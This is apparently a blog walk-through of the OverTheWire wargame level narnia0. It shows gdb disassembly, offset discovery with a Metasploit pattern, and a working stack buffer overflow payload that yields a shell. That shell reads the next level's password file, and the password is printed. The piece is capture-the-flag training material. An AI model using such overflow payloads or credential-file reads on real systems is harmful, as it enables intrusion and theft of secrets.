+++
title = "Over the wire - narnia00"
description = "Walk-through"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "over-the-wire-narnia-00"
project_url = "https://greyhat.dk/over-the-wire-narnia-00"
type = "post"
+++



(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484fd <+0>:	push   ebp
   0x080484fe <+1>:	mov    ebp,esp
   0x08048500 <+3>:	and    esp,0xfffffff0
   0x08048503 <+6>:	sub    esp,0x30 ; 48
   0x08048506 <+9>:	mov    DWORD PTR [esp+0x2c],0x41414141
   0x0804850e <+17>:	mov    DWORD PTR [esp],0x8048630 ; "Correct val's value from 0x41414141 -> 0xdeadbeef!"
   0x08048515 <+24>:	call   0x80483a0 <puts@plt>
   0x0804851a <+29>:	mov    DWORD PTR [esp],0x8048663
   0x08048521 <+36>:	call   0x8048390 <printf@plt>
   0x08048526 <+41>:	lea    eax,[esp+0x18]
   0x0804852a <+45>:	mov    DWORD PTR [esp+0x4],eax
   0x0804852e <+49>:	mov    DWORD PTR [esp],0x8048679
   0x08048535 <+56>:	call   0x80483f0 <__isoc99_scanf@plt>
   0x0804853a <+61>:	lea    eax,[esp+0x18]
   0x0804853e <+65>:	mov    DWORD PTR [esp+0x4],eax
   0x08048542 <+69>:	mov    DWORD PTR [esp],0x804867e
   0x08048549 <+76>:	call   0x8048390 <printf@plt>
   0x0804854e <+81>:	mov    eax,DWORD PTR [esp+0x2c]
   0x08048552 <+85>:	mov    DWORD PTR [esp+0x4],eax
   0x08048556 <+89>:	mov    DWORD PTR [esp],0x8048687
   0x0804855d <+96>:	call   0x8048390 <printf@plt>
   0x08048562 <+101>:	cmp    DWORD PTR [esp+0x2c],0xdeadbeef
   0x0804856a <+109>:	jne    0x804857a <main+125>
   0x0804856c <+111>:	mov    DWORD PTR [esp],0x8048694
   0x08048573 <+118>:	call   0x80483b0 <system@plt>
   0x08048578 <+123>:	jmp    0x8048592 <main+149>
   0x0804857a <+125>:	mov    DWORD PTR [esp],0x804869c
   0x08048581 <+132>:	call   0x80483a0 <puts@plt>
   0x08048586 <+137>:	mov    DWORD PTR [esp],0x1
   0x0804858d <+144>:	call   0x80483d0 <exit@plt>
   0x08048592 <+149>:	mov    eax,0x0
   0x08048597 <+154>:	leave
   0x08048598 <+155>:	ret
End of assembler dump.


(gdb) r
Starting program: /games/narnia/narnia0 reg
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
buf: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7
val: 0x37614136
WAY OFF!!!!
[Inferior 1 (process 5653) exited with code 01]

kgn@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 0x37614136
[*] Exact match at offset 20

(echo "$(python -c 'print "B"*20 + "\xef\xbe\xad\xde"')";cat)|./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
